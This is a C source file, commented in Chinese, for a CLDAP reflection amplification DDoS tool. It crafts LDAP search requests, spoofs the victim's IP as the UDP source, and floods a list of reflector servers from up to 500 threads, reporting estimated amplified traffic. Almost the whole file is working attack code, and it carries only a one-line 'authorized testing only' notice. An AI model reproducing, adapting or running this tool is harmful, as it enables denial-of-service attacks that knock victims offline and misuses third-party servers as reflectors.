/*
 * CLDAP反射放大攻击
 * 2025年Q1增长3,488%的最新攻击向量
 * 放大倍数: 46-55倍
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>

#define MAX_PACKET_SIZE 8192
#define MAX_THREADS 500
#define CLDAP_PORT 389

struct attack_config {
    char target_ip[256];
    int target_port;
    char reflector_file[256];
    int duration;
    int threads;
    volatile int running;
    volatile long packets_sent;
    volatile long bytes_sent;
};

struct reflector {
    struct sockaddr_in addr;
    struct reflector *next;
};

struct thread_data {
    struct attack_config *config;
    struct reflector *reflector_list;
    int thread_id;
};

// CLDAP搜索请求包结构
struct cldap_search_request {
    // LDAP消息头
    unsigned char message_id[4];        // 消息ID
    unsigned char protocol_op;          // 协议操作 (0x63 = SearchRequest)
    unsigned char search_length;       // 搜索长度
    
    // 搜索参数
    unsigned char base_object_length;  // 基础对象长度
    unsigned char scope;               // 搜索范围
    unsigned char deref_aliases;       // 解引用别名
    unsigned char size_limit[4];       // 大小限制
    unsigned char time_limit[4];       // 时间限制
    unsigned char types_only;          // 仅类型
    
    // 搜索过滤器 (objectClass=*)
    unsigned char filter_type;         // 过滤器类型
    unsigned char filter_length;       // 过滤器长度
    unsigned char attribute_name[11];  // "objectClass"
    unsigned char attribute_value[1];  // "*"
    
    // 属性列表 (空)
    unsigned char attributes_length;   // 属性长度
};

// 创建CLDAP搜索请求
int create_cldap_request(char *buffer) {
    // 构造CLDAP搜索请求包
    // 这个请求会让LDAP服务器返回大量数据
    
    unsigned char cldap_packet[] = {
        // LDAP消息序列
        0x30, 0x84, 0x00, 0x00, 0x00, 0x3d,  // 序列，长度61字节
        
        // 消息ID
        0x02, 0x01, 0x01,  // 整数，消息ID=1
        
        // SearchRequest
        0x63, 0x84, 0x00, 0x00, 0x00, 0x34,  // SearchRequest，长度52字节
        
        // baseObject (空字符串)
        0x04, 0x00,  // 八位字节字符串，长度0
        
        // scope (wholeSubtree = 2)
        0x0a, 0x01, 0x02,  // 枚举，值2
        
        // derefAliases (neverDerefAliases = 0)
        0x0a, 0x01, 0x00,  // 枚举，值0
        
        // sizeLimit (0 = 无限制)
        0x02, 0x01, 0x00,  // 整数，值0
        
        // timeLimit (0 = 无限制)
        0x02, 0x01, 0x00,  // 整数，值0
        
        // typesOnly (FALSE)
        0x01, 0x01, 0x00,  // 布尔，FALSE
        
        // filter (objectClass=*)
        0xa3, 0x0f,  // equalityMatch，长度15
        0x04, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x43, 0x6c, 0x61, 0x73, 0x73,  // "objectClass"
        0x04, 0x01, 0x2a,  // "*"
        
        // attributes (请求所有属性)
        0x30, 0x84, 0x00, 0x00, 0x00, 0x00  // 序列，长度0 (所有属性)
    };
    
    memcpy(buffer, cldap_packet, sizeof(cldap_packet));
    return sizeof(cldap_packet);
}

// 创建伪造的UDP包
int create_spoofed_udp_packet(char *packet, const char *src_ip, const char *dst_ip, 
                             int src_port, int dst_port, const char *payload, int payload_len) {
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    char *data;
    
    // IP头部
    ip_header = (struct iphdr *)packet;
    ip_header->version = 4;
    ip_header->ihl = 5;
    ip_header->tos = 0;
    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
    ip_header->id = htons(rand() % 65535);
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_UDP;
    ip_header->check = 0;
    inet_pton(AF_INET, src_ip, &ip_header->saddr);
    inet_pton(AF_INET, dst_ip, &ip_header->daddr);
    
    // UDP头部
    udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
    udp_header->source = htons(src_port);
    udp_header->dest = htons(dst_port);
    udp_header->len = htons(sizeof(struct udphdr) + payload_len);
    udp_header->check = 0;
    
    // 数据部分
    data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    memcpy(data, payload, payload_len);
    
    return sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;
}

// 加载反射器列表
struct reflector *load_reflectors(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        printf("❌ 无法打开反射器文件: %s\n", filename);
        return NULL;
    }
    
    struct reflector *head = NULL;
    struct reflector *current = NULL;
    char line[256];
    int count = 0;
    
    while (fgets(line, sizeof(line), file)) {
        // 移除换行符
        line[strcspn(line, "\n")] = 0;
        
        // 跳过空行和注释
        if (strlen(line) == 0 || line[0] == '#') {
            continue;
        }
        
        struct reflector *new_reflector = malloc(sizeof(struct reflector));
        if (!new_reflector) {
            continue;
        }
        
        // 解析IP地址
        memset(&new_reflector->addr, 0, sizeof(new_reflector->addr));
        new_reflector->addr.sin_family = AF_INET;
        new_reflector->addr.sin_port = htons(CLDAP_PORT);
        
        if (inet_pton(AF_INET, line, &new_reflector->addr.sin_addr) <= 0) {
            free(new_reflector);
            continue;
        }
        
        new_reflector->next = NULL;
        
        if (head == NULL) {
            head = new_reflector;
            current = new_reflector;
        } else {
            current->next = new_reflector;
            current = new_reflector;
        }
        
        count++;
    }
    
    fclose(file);
    printf("✅ 加载了 %d 个CLDAP反射器\n", count);
    return head;
}

void *attack_thread(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    struct attack_config *config = data->config;
    struct reflector *reflector_list = data->reflector_list;
    
    int sock;
    char packet[MAX_PACKET_SIZE];
    char cldap_request[256];
    int cldap_len;
    
    // 创建原始socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        printf("❌ 线程 %d: 无法创建原始socket (需要root权限)\n", data->thread_id);
        return NULL;
    }
    
    // 设置IP_HDRINCL选项
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        printf("❌ 线程 %d: 设置IP_HDRINCL失败\n", data->thread_id);
        close(sock);
        return NULL;
    }
    
    // 创建CLDAP请求
    cldap_len = create_cldap_request(cldap_request);
    
    printf("✅ 线程 %d: 开始CLDAP放大攻击\n", data->thread_id);
    
    struct reflector *current_reflector = reflector_list;
    
    while (config->running) {
        if (!current_reflector) {
            current_reflector = reflector_list; // 重新开始
            if (!current_reflector) break;
        }
        
        // 创建伪造的UDP包 (源IP为目标IP)
        int packet_len = create_spoofed_udp_packet(
            packet,
            config->target_ip,  // 伪造源IP为目标IP
            inet_ntoa(current_reflector->addr.sin_addr),  // 发送到CLDAP服务器
            rand() % 65535 + 1024,  // 随机源端口
            CLDAP_PORT,  // CLDAP端口389
            cldap_request,
            cldap_len
        );
        
        // 发送伪造包
        if (sendto(sock, packet, packet_len, 0, 
                  (struct sockaddr *)&current_reflector->addr, 
                  sizeof(current_reflector->addr)) > 0) {
            config->packets_sent++;
            config->bytes_sent += packet_len;
        }
        
        current_reflector = current_reflector->next;
        
        // 控制发送频率
        usleep(100); // 100微秒延迟
    }
    
    close(sock);
    printf("✅ 线程 %d: CLDAP攻击结束\n", data->thread_id);
    return NULL;
}

void print_stats(struct attack_config *config) {
    time_t start_time = time(NULL);
    
    while (config->running) {
        sleep(5);
        time_t elapsed = time(NULL) - start_time;
        
        printf("\n=== CLDAP放大攻击统计 ===\n");
        printf("目标: %s:%d\n", config->target_ip, config->target_port);
        printf("运行时间: %ld秒\n", elapsed);
        printf("发送包数: %ld\n", config->packets_sent);
        printf("发送字节: %ld (%.2f MB)\n", config->bytes_sent, config->bytes_sent / 1024.0 / 1024.0);
        printf("平均PPS: %ld\n", elapsed > 0 ? config->packets_sent / elapsed : 0);
        printf("预估放大流量: %.2f MB (按50倍计算)\n", config->bytes_sent * 50 / 1024.0 / 1024.0);
        printf("活跃线程: %d\n", config->threads);
        printf("========================\n");
    }
}

void signal_handler(int sig) {
    printf("\n收到停止信号，正在清理...\n");
    exit(0);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("CLDAP反射放大攻击工具 (2025年最新)\n");
        printf("使用方法: %s <目标IP> <端口> <反射器文件> <线程数> <持续时间>\n", argv[0]);
        printf("示例: %s 192.168.1.100 80 cldap_reflectors.txt 50 300\n", argv[0]);
        printf("\n⚠️  注意: 需要root权限运行\n");
        printf("⚠️  2025年Q1此攻击增长了3,488%%\n");
        return 1;
    }
    
    if (getuid() != 0) {
        printf("❌ 需要root权限运行此程序\n");
        return 1;
    }
    
    struct attack_config config;
    strcpy(config.target_ip, argv[1]);
    config.target_port = atoi(argv[2]);
    strcpy(config.reflector_file, argv[3]);
    config.threads = atoi(argv[4]);
    config.duration = atoi(argv[5]);
    config.running = 1;
    config.packets_sent = 0;
    config.bytes_sent = 0;
    
    if (config.threads > MAX_THREADS) {
        config.threads = MAX_THREADS;
    }
    
    printf("🚀 启动CLDAP反射放大攻击\n");
    printf("目标: %s:%d\n", config.target_ip, config.target_port);
    printf("反射器文件: %s\n", config.reflector_file);
    printf("线程数: %d\n", config.threads);
    printf("持续时间: %d秒\n", config.duration);
    printf("预期放大倍数: 46-55倍\n");
    printf("⚠️  仅用于授权测试！\n\n");
    
    // 加载反射器列表
    struct reflector *reflector_list = load_reflectors(config.reflector_file);
    if (!reflector_list) {
        printf("❌ 无法加载反射器列表\n");
        return 1;
    }
    
    // 设置信号处理
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // 创建攻击线程
    pthread_t threads[MAX_THREADS];
    struct thread_data thread_data[MAX_THREADS];
    
    for (int i = 0; i < config.threads; i++) {
        thread_data[i].config = &config;
        thread_data[i].reflector_list = reflector_list;
        thread_data[i].thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, &thread_data[i]);
        usleep(10000); // 10ms间隔启动线程
    }
    
    // 启动统计线程
    pthread_t stats_thread;
    pthread_create(&stats_thread, NULL, (void *)print_stats, &config);
    
    // 等待指定时间
    sleep(config.duration);
    
    // 停止攻击
    config.running = 0;
    printf("\n⏰ 攻击时间结束，正在停止所有线程...\n");
    
    // 等待所有线程结束
    for (int i = 0; i < config.threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n✅ CLDAP放大攻击完成\n");
    printf("最终统计:\n");
    printf("- 发送包数: %ld\n", config.packets_sent);
    printf("- 发送字节: %ld\n", config.bytes_sent);
    printf("- 预估放大效果: %ld字节 (%.2f GB)\n", 
           config.bytes_sent * 50, config.bytes_sent * 50 / 1024.0 / 1024.0 / 1024.0);
    
    return 0;
}
